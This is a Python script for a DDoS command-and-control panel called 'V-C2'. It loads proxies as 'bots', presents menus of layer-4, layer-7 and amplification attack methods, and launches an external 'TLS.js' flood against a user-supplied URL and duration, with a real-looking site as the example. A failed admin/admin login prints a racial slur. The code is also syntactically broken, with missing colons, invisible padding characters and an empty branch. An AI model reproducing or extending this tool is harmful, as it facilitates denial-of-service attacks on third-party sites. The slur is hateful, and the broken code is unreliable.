import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def main():
    while(True):
        cnc = input('''root@root''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            special()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            banners()

        elif cnc == "http-tls"
      ‎ ‎ ‎ ‎ ‎ ‎ try:
        ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node TLS.js {url} {time}')
            except IndexError:
                print('Usage: http-tls <url> <time>')
                print('Example: http-tls http://vailon.com 60')
      ‎‎  elif cnc == "http-browser"

      
        elif "help" in cnc:
            print(f'''
LAYER7  ► SHOW LAYER7 METHODS
LAYER4  ► SHOW LAYER4 METHODS
RULE‎ ‎ ‎ ‎ ► SHOW RULES METHODS
MENU‎ ‎ ‎ ‎ ► SHOW HOME MENU
EXIT‎  ‎ ‎ ► EXIT TOOLS
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "admin"
    passwd = "admin"
    username = input("Username: ")
    password = getpass.getpass(prompt='Password: ')
    if username != user or password != passwd:
        print("")
        print("NIGGERS")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Welcome to V-C2!")
        time.sleep(0.3)
        main()

login()
